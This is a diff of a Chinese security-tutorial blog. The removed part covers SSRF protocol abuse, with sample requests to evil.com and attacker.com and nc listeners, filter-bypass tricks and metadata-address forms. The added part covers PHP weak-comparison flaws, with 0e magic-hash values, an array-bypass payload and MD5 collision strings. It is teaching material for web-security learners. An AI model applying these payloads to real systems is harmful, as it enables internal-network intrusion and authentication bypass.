-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></blockquote>
-<p><strong>3、sftp</strong></p>
-<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure></blockquote>
-<p><strong>4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</strong></p>
-<p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></blockquote>
-<p><strong>5、tftp:&#x2F;&#x2F;</strong></p>
-<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></blockquote>
-<p><strong>6、gopher:&#x2F;&#x2F;</strong></p>
-<p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);?&gt;</span><br><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure></blockquote>
-<hr>
-<h2 id="六、SSRF漏洞利用（危害）"><a href="#六、SSRF漏洞利用（危害）" class="headerlink" title="六、SSRF漏洞利用（危害）"></a>六、SSRF漏洞利用（危害）</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
-<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
-<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
-<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
-<p>5.利用file协议读取本地文件等。.</p>
-<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
-<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
-<hr>
-<h2 id="七、SSRF绕过方式"><a href="#七、SSRF绕过方式" class="headerlink" title="七、SSRF绕过方式"></a>七、SSRF绕过方式</h2><p><strong>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</strong></p>
-<p>一、常见的绕过方式</p>
-<p><strong>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以尝试采用http基本身份认证的方式绕过</span><br><span class="line">如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</span><br><span class="line">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</span><br></pre></td></tr></table></figure></blockquote>
-<p><strong>2.采用短网址绕过</strong></p>
-<blockquote>
-<p>比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a></p>
-</blockquote>
-<p><strong>3.采用进制转换</strong></p>
-<blockquote>
-<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
-</blockquote>
-<p><img src="/.com//image-20250520030023-ukm1uls.png" alt="image"></p>
-<p><strong>4.利用特殊域名</strong></p>
-<blockquote>
-<p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
-</blockquote>
-<p><strong>5.利用[::]</strong></p>
-<blockquote>
-<p>可以利用[::]来绕过localhost<br><a target="_blank" rel="noopener" href="http://169.254.169.254/%3E/%3Ehttp://[::169.254.169.254]">http://169.254.169.254\&gt;\&gt;http://[::169.254.169.254]</a></p>
-</blockquote>
-<p><strong>6.利用句号</strong></p>
-<blockquote>
-<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
-</blockquote>
-<p><strong>7、CRLF 编码绕过</strong></p>
-<blockquote>
-<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </span><br></pre></td></tr></table></figure>
-
-<p><strong>8.利用封闭的字母数字</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
-
-<p>二、常见限制</p>
-<p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
-<blockquote>
-<p>采用http基本身份认证的方式绕过，即@<br><a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p>
-</blockquote>
-<p>2.限制请求IP不为内网地址</p>
-<blockquote>
-<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
-</blockquote>
-<p>3.限制请求只为http协议</p>
-<blockquote>
-<p>（1）采取302跳转<br>（2）采取短地址</p>
-</blockquote>
-<hr>
-<h2 id="八、SSRF漏防御"><a href="#八、SSRF漏防御" class="headerlink" title="八、SSRF漏防御"></a>八、SSRF漏防御</h2><p>通常有以下5个思路：</p>
-<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
-<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
-<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
-<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
-<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/SSRF/" data-id="cmawck7hl0006rk7khjeua66e" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" data-id="cmawcq0mi0004rk7k8ic55b35" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1406,7 +937,327 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" data-id="cmawck7hn0009rk7kf2vjdt3m" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" data-id="cmawcq0mj0005rk7k6gbj2agf" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/PHP比较漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP比较漏洞"><a href="#PHP比较漏洞" class="headerlink" title="PHP比较漏洞"></a>PHP比较漏洞</h1><h1 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.comparison.php">php</a>中有两种比较的符号 <code>==</code>​ 与 <code>===</code>​</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">	<span class="variable">$a</span> == <span class="variable">$b</span>;  <span class="comment">// ==  在进行比较的时候，会先将字符串类型转化成相同，再比较</span></span><br><span class="line">	<span class="variable">$a</span> === <span class="variable">$b</span>; <span class="comment">// === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x3D;&#x3D;PHP 8.0.0 之前，如果 string 与数字或者以数字开头的字符串进行比较， 则在&#x3D;&#x3D;​**&#x3D;&#x3D;比较前会将 string 转化为数字&#x3D;&#x3D;**​&#x3D;&#x3D;。&#x3D;&#x3D;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250417174634-5opnoh2.png" alt="image"></p>
+<p><img src="/.com//image-20250417174637-541lm5p.png" alt="image"></p>
+<p>实验结果：</p>
+<ol>
+<li>​<code>&quot;admin&quot;==0</code>​ 比较的时候，会将字符串<code>admin</code>​强制转化成整数<code>0</code>​</li>
+<li>​<code>&quot;1admin&quot;==1</code>​ 比较的时候，会将字符串<code>1admin</code>​强制转化成整数<code>1</code>​</li>
+<li>字符串<code>admin1</code>​强制转化成整数<code>0</code>​</li>
+<li>​<code>&quot;0e123456&quot;==&quot;0e456789&quot;</code>​比较的时候，PHP会将开头为<code>0e</code>​这类字符串识别为科学计数法的数字，<code>0e123456</code>​相当于<code>&lt;span class=&quot;ne-text&quot;&gt;0*10&lt;/span&gt;&lt;sup&gt;123456&lt;/sup&gt;&lt;span class=&quot;ne-text&quot;&gt; = 0&lt;/span&gt;</code>​，同理，<code>0e456789=0</code>​，所以两者相等。</li>
+</ol>
+<blockquote>
+<p>注意：例子中的字符串还有一个特征，<code>0e</code>​后面字符全是数字，才能漏洞利用，否则例如<code>0e3f2c44</code>​仍然会被识别成字符串。</p>
+</blockquote>
+<h1 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h1><p><img src="/.com//image-20250417174658-89jjpnd.png" alt="image"></p>
+<p><img src="/.com//image-20250417174701-vej9ys6.png" alt="image"></p>
+<p>&#x3D;&#x3D;当字符串被强制转化为数值，其结果和类型如下:&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;如果该字符串没有包含&#x3D;&#x3D;​&#x3D;&#x3D;​<code>&#39;.&#39;, e, E</code>​&#x3D;&#x3D;​&#x3D;&#x3D;并且其数值在整形范围之内，该字符串作为&#x3D;&#x3D;​&#x3D;&#x3D;​<code>int</code>​&#x3D;&#x3D;​&#x3D;&#x3D;来取值，其他所有情况下都被作为&#x3D;&#x3D;​&#x3D;&#x3D;​<code>float</code>​&#x3D;&#x3D;​&#x3D;&#x3D;来取值；&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。&#x3D;&#x3D;</p>
+<p>也印证了实验1中通过<code>&quot;admin1&quot;==1 =&gt;False</code>​</p>
+<h1 id="0e绕过弱比较-MD5和SHA1函数漏洞"><a href="#0e绕过弱比较-MD5和SHA1函数漏洞" class="headerlink" title="0e绕过弱比较-MD5和SHA1函数漏洞"></a>0e绕过弱比较-MD5和SHA1函数漏洞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &amp;&amp;<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) == <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">  </span><br><span class="line">(<span class="title function_ invoke__">sha1</span>(<span class="variable">$s1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$s2</span>) &amp;&amp; <span class="variable">$s1</span>!=<span class="variable">$s2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​<code>sha1</code>​和<code>md5</code>​属于哈希编码，在<code>PHP</code>​中，这两种编码是存在绕过漏洞的。</p>
+<p>PHP在处理哈希字符串时，利用<code>!=</code>​或<code>==</code>​来对哈希值进行比较，把以<code>0e</code>​开头的哈希值都解释为<code>0</code>​，所以如果两个不同的密码经过哈希加密后，其哈希值都是以<code>0e</code>​开头的，那么<code>0e</code>​将会认为他们相同，都是<code>0</code>​。只需要传入开头都是<code>0e</code>​的两个值，比如<code>$s1=QNKCDZO</code>​,<code> $s2=240610708</code>​, 便可成功绕过。</p>
+<p>利用<code>0e</code>​绕过方式只有在弱比较的时候才能使用。</p>
+<h1 id="实验3"><a href="#实验3" class="headerlink" title="实验3"></a>实验3</h1><p><img src="/.com//image-20250417174743-u6bmulp.png" alt="image"></p>
+<p><img src="/.com//image-20250417174746-61l5osn.png" alt="image"></p>
+<p>以下值在<code>md5</code>​加密后以<code>0e</code>​开头：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
+
+<p>验证</p>
+<p><img src="/.com//image-20250417174803-33e2qv1.png" alt="image"></p>
+<p>批量验证</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;QNKCDZO&#x27;</span>, <span class="string">&#x27;240610708&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s878926199a&#x27;</span>, <span class="string">&#x27;s155964671a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s214587387a&#x27;</span>, <span class="string">&#x27;s214587387a&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250417174815-hvdrbp5.png" alt="image"></p>
+<p>以下值在<code>sha1</code>​加密后以<code>0e</code>​开头</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">10932435112</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;aaroZmOk&#x27;</span>, <span class="string">&#x27;aaK1STfY&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aaO8zKZF&#x27;</span>, <span class="string">&#x27;aa3OFF9m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0e1290633704&#x27;</span>, <span class="string">&#x27;10932435112&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">sha1</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250417174829-y4ysat8.png" alt="image"></p>
+<p>双重<code>MD5</code>​加密后<code>0e</code>​开头：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;7r4lGXCH2Ksu2JNT3BYM&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CbDLytmyGm2xQyaLNhWn&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;770hQgrBOjrcqftrlaZk&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(cipher.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250417174839-vxse526.png" alt="image"></p>
+<blockquote>
+<p>其它情况：会限制字符串为纯数字或字母</p>
+</blockquote>
+<p>‍</p>
+<h1 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h1><p>对于php强比较和弱比较：<code>md5()</code>​，<code>sha1()</code>​函数无法处理数组，如果传入的为数组，会返回<code>NULL</code>​，所以两个数组经过加密后得到的都是<code>NULL</code>​，也就是相等的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!==<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;...&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​<code>payload: ?a[]=1&amp;b[]=2	</code>​</p>
+<p>‍</p>
+<h1 id="实验4"><a href="#实验4" class="headerlink" title="实验4"></a>实验4</h1><p><img src="/.com//image-20250417174912-0qsam45.png" alt="image"></p>
+<p><img src="/.com//image-20250417174914-tik3goc.png" alt="image"></p>
+<p>‍</p>
+<h1 id="实验5"><a href="#实验5" class="headerlink" title="实验5"></a>实验5</h1><p>查看报错信息去验证上述结论</p>
+<p><img src="/.com//image-20250417174924-ovxj2mz.png" alt="image"></p>
+<p><img src="/.com//image-20250417174927-4udg3hc.png" alt="image"></p>
+<p>​<code>md5()</code>​函数希望接受的是字符串而不是数组。</p>
+<p>‍</p>
+<h1 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]!==(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; </span><br><span class="line">   <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;...&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比较<code>a</code>​，<code>b</code>​时会将<code>a</code>​，<code>b</code>​转换为字符串比较，就不能用数组绕过了。因为数组转换为字符串时都会变成<code>&quot;Array&quot;</code>​。</p>
+<p>‍</p>
+<h1 id="实验6"><a href="#实验6" class="headerlink" title="实验6"></a>实验6</h1><p><img src="/.com//image-20250417174950-8fwszbt.png" alt="image"></p>
+<p><img src="/.com//image-20250417174953-l3vi7qb.png" alt="image"></p>
+<p>因为数组要求构造a和b不同，但是MD5相同，也就是说要求传入两个MD5相同的不同字符串。所以我们只能用MD5碰撞来实现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"><span class="variable">$b</span>=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="实验7"><a href="#实验7" class="headerlink" title="实验7"></a>实验7</h1><p><img src="/.com//image-20250417175005-bwx4402.png" alt="image"></p>
+<p><img src="/.com//image-20250417175008-g6uw5ex.png" alt="image"></p>
+<p>‍</p>
+<p>文件：</p>
+<p>linux使用md5collgen碰撞生成两个md5值相同但内容不同的文件</p>
